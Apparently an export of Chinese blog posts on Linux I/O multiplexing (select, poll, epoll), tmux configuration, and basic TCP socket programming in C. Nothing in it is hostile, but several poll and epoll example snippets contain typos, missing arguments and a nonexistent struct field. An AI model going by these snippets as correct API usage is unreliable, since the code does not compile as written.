<span class="hljs-number">20</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>rset = fdset;<br><span class="hljs-type">int</span> nfds = select(maxfd, &amp;rset, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;timeout);<br>        <span class="hljs-comment">//maxfd为监听的最大的文件描述符+1,maxfd为为轮询机制,每次都会轮询所有的fd看是否发生异常</span><br><span class="hljs-comment">// select函数返回值大于0代表有文件描述符有数据到来,返回值小于0代表发生了异常,返回值等于0代表超时</span><br><span class="hljs-keyword">if</span> (nfds &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;select&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nfds == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;select timeout\n&quot;</span>);<br><span class="hljs-keyword">continue</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (FD_ISSET(fd, &amp;rset)) &#123;<br>Handler(fd, &amp;fdset);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-使用poll实现I-x2F-O多路复用"><a href="#2-使用poll实现I-x2F-O多路复用" class="headerlink" title="2.使用poll实现I&#x2F;O多路复用"></a>2.使用poll实现I&#x2F;O多路复用</h4><h5 id="2-1-涉及的api"><a href="#2-1-涉及的api" class="headerlink" title="2.1.涉及的api"></a>2.1.涉及的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> &#123;</span><br>               <span class="hljs-type">int</span>   fd;         <span class="hljs-comment">/* file descriptor */</span><br>               <span class="hljs-type">short</span> events;     <span class="hljs-comment">/* requested events */</span><br>               <span class="hljs-type">short</span> revents;    <span class="hljs-comment">/* returned events */</span><br>           &#125;;<br><span class="hljs-comment">//fd为监听的文件描述符</span><br><span class="hljs-comment">//events为监听的事件</span><br><span class="hljs-comment">//revents为发生的事件</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">poll</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pollfd *fds,<span class="hljs-type">nfds_t</span> nfds,<span class="hljs-type">int</span> timeout)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">ppoll</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pollfd *fds,<span class="hljs-type">nfds_t</span> nfds,cont <span class="hljs-keyword">struct</span> timespec *tmo_p,<span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *sigmask)</span>;<br><span class="hljs-comment">//功能:同时监听多个文件描述符,底层原理和select一样,只是将原有的fd_set改为了struct pollfd结构体</span><br><br><span class="hljs-comment">//参数 </span><br><span class="hljs-comment">//fds,监听的pollfd的数组指针,nfds,监听的文件描述符的个数,timeout为超时时间,sigmask为屏蔽的信号集合</span><br><br><span class="hljs-comment">//返回值</span><br><span class="hljs-comment">//成功时返回一个正数(具有非零revents的结构体数量)</span><br><span class="hljs-comment">//错误时</span><br><span class="hljs-comment">// EFAULT 给出的参数不在可用的调用地址空间内.</span><br><span class="hljs-comment">// EINTR  被信号打断</span><br><span class="hljs-comment">// EINVAL nfds 值超过了 RLIMIT_NOFILE 值。</span><br><span class="hljs-comment">// EINVAL (ppoll()) The timeout value expressed in *ip is invalid (negative).</span><br><span class="hljs-comment">// ENOMEM 没有空间来分配文件描述符表</span><br></code></pre></td></tr></table></figure><h5 id="2-2-操作实例"><a href="#2-2-操作实例" class="headerlink" title="2.2.操作实例"></a>2.2.操作实例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> fd;<span class="hljs-comment">//需要监听的文件描述符</span><br>    <span class="hljs-type">short</span> event;<span class="hljs-comment">//需要监听的事件</span><br>    <span class="hljs-type">short</span> revent;<span class="hljs-comment">//已经发生的事件</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FD 100</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fd</span>[<span class="hljs-title">MAX_FD</span>];</span><br>    <span class="hljs-comment">//设置监听事件和监听的文件描述符</span><br>    fd[i].event = POLLIN<br>    <span class="hljs-comment">//设置完成后</span><br>    <span class="hljs-type">int</span> nfds = poll(<span class="hljs-keyword">struct</span> pollfd fds[], <span class="hljs-type">nfds_t</span> nfds, <span class="hljs-type">int</span> timeout);<br><span class="hljs-comment">//比较revent看revent是否发生了变化,若发生了变化则文件描述符则该文件描述符有数据到来</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;MAX_FD,i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span>(fd[i].revent &amp; POLLIN)<br>        .....<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-使用epoll实现I-x2F-O多路复用"><a href="#3-使用epoll实现I-x2F-O多路复用" class="headerlink" title="3.使用epoll实现I&#x2F;O多路复用"></a>3.使用epoll实现I&#x2F;O多路复用</h4><h5 id="3-1-涉及的api"><a href="#3-1-涉及的api" class="headerlink" title="3.1.涉及的api"></a>3.1.涉及的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_create</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>;<br><span class="hljs-comment">// 内核中间加一个 ep 对象，把所有需要监听的 socket 都放到 ep 对象中,返回一个ep对象,linux2.6.8开始忽略了size的意义</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_ctl</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-type">int</span> op, <span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> epoll_event *event)</span>;<br><span class="hljs-comment">//负责把 socket 增加、删除到内核红黑树</span><br><span class="hljs-comment">//参数:epfd为ep对象,op为操作类型,fd为监听的文件描述符</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_wait</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-keyword">struct</span> epoll_event * events, <span class="hljs-type">int</span> maxevents, <span class="hljs-type">int</span> timeout)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_pwait</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-keyword">struct</span> epoll_event * events, <span class="hljs-type">int</span> maxevents, <span class="hljs-type">int</span> timeout,<span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *sigmask)</span>;<br><span class="hljs-comment">//负责检测可读队列，没有可读 socket 则阻塞进程,epfd为ep对象,events,为发生存储已经发生事件的结构体数组，maxevents为最大可发生的事件的文件描述符的数量,timeout为超时时间</span><br></code></pre></td></tr></table></figure><h5 id="3-2-操作实例"><a href="#3-2-操作实例" class="headerlink" title="3.2.操作实例"></a>3.2.操作实例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/epoll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_bind_listen</span><span class="hljs-params">(<span class="hljs-type">char</span> *address,<span class="hljs-type">char</span> *port,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> backlog)</span><br>&#123;<br>    <span class="hljs-comment">//......</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd = create_bind_listen(argv[<span class="hljs-number">1</span>],argv[<span class="hljs-number">2</span>],<span class="hljs-number">10</span>);<br>    <span class="hljs-type">int</span> epfd = epoll_create(<span class="hljs-number">100</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">epoll_fd</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">event_epoll</span>[10];</span><br>    epoll_fd.fd = fd;<br>    epoll_fd.events = EPOLLIN;<br>    epoll_fd.data.fd = fd;<br>    epoll_ctl(epfd,EPOLL_CTL_ADD,&amp;epoll_fd);<br>    <span class="hljs-type">int</span> event_count = epoll_wait(epfd,event_epoll,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;event_count;i++)<br>    &#123;<br>        <span class="hljs-comment">//handler(event_poll[i].fd);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tmux基本使用</title>
    <link href="/2022/04/17/tmux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/04/17/tmux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="tmux配置教程"><a href="#tmux配置教程" class="headerlink" title="tmux配置教程"></a>tmux配置教程</h1><h3 id="1-tmux是什么"><a href="#1-tmux是什么" class="headerlink" title="1.tmux是什么?"></a>1.tmux是什么?</h3><p>tmux是一个终端复用工具,在实际开发运维中,可以用来保存当前工作状态,也可以将当前的单个终端拆分多个窗口。</p><h3 id="2-tmux的基本结构"><a href="#2-tmux的基本结构" class="headerlink" title="2.tmux的基本结构"></a>2.tmux的基本结构</h3><p>tmux为C&#x2F;S架构,tmux进程为守护进程,独立于终端之外,在不使用tmux的情况下,在当前终端执行的所有任务都为当前终端的子进程,而在使用了tmux之后,在tmux下执行的任务为tmux的子进程,而tmux为一个守护进程,因此不用担心在退出当前终端或者远程ssh突然断网时，执行的任务被杀死的情况.</p><h3 id="3-tmux的三个概念"><a href="#3-tmux的三个概念" class="headerlink" title="3.tmux的三个概念"></a>3.tmux的三个概念</h3><ul><li><p>1.session</p><p>一个session就是一个会话,session为tmux的一个会话,一个tmux可以同时开多个session</p></li><li><p>2.windows</p><p>window为session的子集,一个session可以有有多个window</p></li><li><p>3.pannel</p><p>一个pannel为一个窗格,为window的子集,一个window可以有多个pannel</p></li></ul><h3 id="4-tmux的安装使用"><a href="#4-tmux的安装使用" class="headerlink" title="4.tmux的安装使用"></a>4.tmux的安装使用</h3><h5 id="tmux的安装"><a href="#tmux的安装" class="headerlink" title="tmux的安装"></a>tmux的安装</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S tmux<br></code></pre></td></tr></table></figure><h5 id="tmux配置文件"><a href="#tmux配置文件" class="headerlink" title="tmux配置文件"></a>tmux配置文件</h5><p>tmux系统配置文件为&#x2F;etc&#x2F;tmux.conf,用户配置文件为~&#x2F;.tmux.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#解绑prefix键位</span><br>unbind C-b<br>unbind <span class="hljs-string">&#x27;&quot;&#x27;</span><br>unbind <span class="hljs-string">&#x27;%&#x27;</span><br><span class="hljs-comment">#设置prefix键位为C-a</span><br><span class="hljs-built_in">set</span> -g prefix C-a<br><span class="hljs-built_in">bind</span> C-a send-prefix<br><span class="hljs-comment">#设置切分窗格键位为prefix和h以及prefix和v</span><br><span class="hljs-built_in">bind</span> h split-window -h<br><span class="hljs-built_in">bind</span> v split-window -v<br><span class="hljs-comment">#设置C-r为重载tmux配置文件(指定-n为不用使用prefix键位就可以触发)</span><br>bind-key -n C-r source-file ~/.tmux.conf<br><span class="hljs-comment">#设置调整窗格大小键位(指定-r键位为不用每次触发的时候都要使用prefix键位(只要摁一次prefix键位就可以持续出发操作))</span><br><span class="hljs-built_in">bind</span> -r H resize-pane -L 5<br><span class="hljs-built_in">bind</span> -r J resize-pane -D 5<br><span class="hljs-built_in">bind</span> -r K resize-pane -U 5<br><span class="hljs-built_in">bind</span> -r L resize-pane -R 5<br><span class="hljs-comment">#bind k selectp -U</span><br><span class="hljs-comment">#bind h selectp -L</span><br><span class="hljs-comment">#bind j selectp -D</span><br><span class="hljs-comment">#bind l selectp -R</span><br><span class="hljs-comment">#bind -r ^k resizep -U 5</span><br><span class="hljs-comment">#bind -r ^h resizep -L 5</span><br><span class="hljs-comment">#bind -r ^j resizep -D 5</span><br><span class="hljs-comment">#bind -r ^l resizep -R 5</span><br></code></pre></td></tr></table></figure><h5 id="tmux常用命令"><a href="#tmux常用命令" class="headerlink" title="tmux常用命令"></a>tmux常用命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建一个tmux会话并在该tmux会话下创建一个窗口并在该窗口下创建一个pannel</span><br>tmux<br><span class="hljs-comment">#查看tmux会话</span><br>tmux list-session<br><span class="hljs-comment">#离开tmux会话</span><br>tmux detach<br><span class="hljs-comment">#进入已经打开的tmux会话</span><br>tmux attach<br><span class="hljs-comment">#Ctrl+b %：划分左右两个窗格。</span><br><span class="hljs-comment">#Ctrl+b &quot;：划分上下两个窗格。</span><br><span class="hljs-comment">#Ctrl+b &lt;arrow key&gt;：光标切换到其他窗格。&lt;arrow key&gt;是指向要切换到的窗格的方向键，比如切换到下方窗格，就按方向键↓。</span><br><span class="hljs-comment">#Ctrl+b ;：光标切换到上一个窗格。</span><br><span class="hljs-comment">#Ctrl+b o：光标切换到下一个窗格。</span><br><span class="hljs-comment">#Ctrl+b &#123;：当前窗格与上一个窗格交换位置。</span><br><span class="hljs-comment">#Ctrl+b &#125;：当前窗格与下一个窗格交换位置。</span><br><span class="hljs-comment">#Ctrl+b Ctrl+o：所有窗格向前移动一个位置，第一个窗格变成最后一个窗格。</span><br><span class="hljs-comment">#Ctrl+b Alt+o：所有窗格向后移动一个位置，最后一个窗格变成第一个窗格。</span><br><span class="hljs-comment">#Ctrl+b x：关闭当前窗格。</span><br><span class="hljs-comment">#Ctrl+b !：将当前窗格拆分为一个独立窗口。</span><br><span class="hljs-comment">#Ctrl+b z：当前窗格全屏显示，再使用一次会变回原来大小。</span><br><span class="hljs-comment">#Ctrl+b Ctrl+&lt;arrow key&gt;：按箭头方向调整窗格大小。</span><br><span class="hljs-comment">#Ctrl+b q：显示窗格编号。</span><br><br><span class="hljs-comment">#切换窗格</span><br><br><span class="hljs-comment"># 光标切换到上方窗格</span><br>tmux select-pane -U<br><br><span class="hljs-comment"># 光标切换到下方窗格</span><br>tmux select-pane -D<br><br><span class="hljs-comment"># 光标切换到左边窗格</span><br>tmux select-pane -L<br><br><span class="hljs-comment"># 光标切换到右边窗格</span><br>tmux select-pane -R<br><br><span class="hljs-comment">#交换窗格</span><br><br><span class="hljs-comment"># 当前窗格上移</span><br>tmux swap-pane -U<br><br><span class="hljs-comment"># 当前窗格下移</span><br>tmux swap-pane -D<br><span class="hljs-comment">#窗口管理</span><br><br><span class="hljs-comment">#创建一个新的窗口</span><br>tmux new-window <span class="hljs-string">&quot;window-name&quot;</span><br><span class="hljs-comment">#切换窗口</span><br>tmux select-window -t &lt;window-number&gt; or &lt;window-name&gt;<br><span class="hljs-comment">#重命名window(修改当前窗口的名称)</span><br>tmux rename-window <span class="hljs-string">&quot;new-name&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置与使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>socket编程</title>
    <link href="/2022/04/17/socket%E7%BC%96%E7%A8%8B/"/>
    <url>/2022/04/17/socket%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="socket编程"><a href="#socket编程" class="headerlink" title="socket编程"></a>socket编程</h1><h4 id="1-什么是socket"><a href="#1-什么是socket" class="headerlink" title="1.什么是socket?"></a>1.什么是socket?</h4><p>socket是应用层与TCP&#x2F;IP协议簇通信的中间抽象层,就是对网络中不同主机的应用进程之间进行双向通信的端点的抽象,提供了应用层进程利用网络协议交换数据的机制。套接字上联应用层，下联协议栈，是应用程序利用网络协议进行通信的接口</p><h4 id="2-socket分类"><a href="#2-socket分类" class="headerlink" title="2.socket分类"></a>2.socket分类</h4><ul><li><p>SOCK_STREAM</p><p>基于TCP协议,面向连接,提供可靠传输,拥塞控制,数据校验,数据重传</p></li><li><p>SOCK_DGRAM</p><p>尽最大努力交付,可以一对多通信,多对多通信</p></li><li><p>SOCK_RAM</p><p>基于ip协议,可以基于ip协议自行组装数据包,利用原始套接字可以处理如ICMP,IGMP,等网络层的数据包。</p></li></ul><h4 id="3-常用的api"><a href="#3-常用的api" class="headerlink" title="3.常用的api"></a>3.常用的api</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">socket</span><span class="hljs-params">(<span class="hljs-type">int</span> domain,<span class="hljs-type">int</span> type,<span class="hljs-type">int</span> protocol)</span>                    <span class="hljs-comment">//用于创建一个socket</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bind</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr,<span class="hljs-type">socklen_t</span> len)</span>      <span class="hljs-comment">//用于绑定一个端口</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">listen</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">int</span> backlog)</span>;                                 <span class="hljs-comment">//用于监听即将到来的连接</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr,<span class="hljs-type">socklen_t</span> len)</span>   <span class="hljs-comment">//用于连接一个远程服务器</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> count)</span>                     <span class="hljs-comment">//用于读取socket缓冲区内容</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> count)</span>                    <span class="hljs-comment">//用于将数据拷贝到发送缓冲区</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">send</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">int</span> flags)</span>       <span class="hljs-comment">//类似于write函数</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">recv</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd,<span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">int</span> flags)</span>         <span class="hljs-comment">//类似于read函数</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sendto</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">int</span> flags,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *dest_addr,<span class="hljs-type">socklen_t</span> addrlen)</span>;                         <span class="hljs-comment">//用于udp socket编程发送数据</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">recvfrom</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd,<span class="hljs-type">void</span> *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">int</span> flags,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *src_addr,<span class="hljs-type">socklen_t</span> *addrlen)</span>;                                    <span class="hljs-comment">//用于udp socket编程接收数据</span><br></code></pre></td></tr></table></figure><h4 id="4-基本的编程步骤"><a href="#4-基本的编程步骤" class="headerlink" title="4.基本的编程步骤"></a>4.基本的编程步骤</h4><p>服务端</p><pre><code class=" mermaid">graph TD;a(socket 创建socket文件)--&gt;b(bind 绑定端口和ip地址)--&gt;c(listen 开始监听ip和端口)--&gt;d(accept 接收来自客户端的连接)--&gt;e(read/write开始和客户端收发数据)</code></pre><p>客户端</p><pre><code class=" mermaid">graph TD;a(socket 创建socket文件)--&gt;b(connect 连接服务器)--&gt;c(read/write,开始和服务端收发数据)</code></pre><h4 id="5-实例"><a href="#5-实例" class="headerlink" title="5.实例"></a>5.实例</h4><h5 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKLEN (sizeof(struct sockaddr))</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Usage</span><span class="hljs-params">(<span class="hljs-type">char</span>* argv)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage:\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s SERVERADDR SERVERPORT&quot;</span>, argv);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">New_Socket</span><span class="hljs-params">(<span class="hljs-type">char</span>* addr, <span class="hljs-type">char</span>* port, <span class="hljs-type">int</span> backlog)</span><br>&#123;<br><span class="hljs-comment">//创建socket</span><br><span class="hljs-type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">ADDR</span>;</span><br>ADDR.sin_family = AF_INET;<br>ADDR.sin_port = htons(atoi(port));<br><span class="hljs-keyword">if</span> (inet_pton(AF_INET, addr, &amp;ADDR.sin_addr) != <span class="hljs-number">1</span>) &#123;<br>perror(<span class="hljs-string">&quot;inet_pton&quot;</span>);<br>&#125;<br><span class="hljs-comment">//绑定地址以及端口</span><br><span class="hljs-keyword">if</span> (bind(fd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;ADDR, SOCKLEN) != <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;bind&quot;</span>);<br>&#125;<br><span class="hljs-comment">//进入监听状态,等待接收来之客户端的连接</span><br><span class="hljs-keyword">if</span> (listen(fd, backlog) != <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;listen&quot;</span>);<br>&#125;<br><span 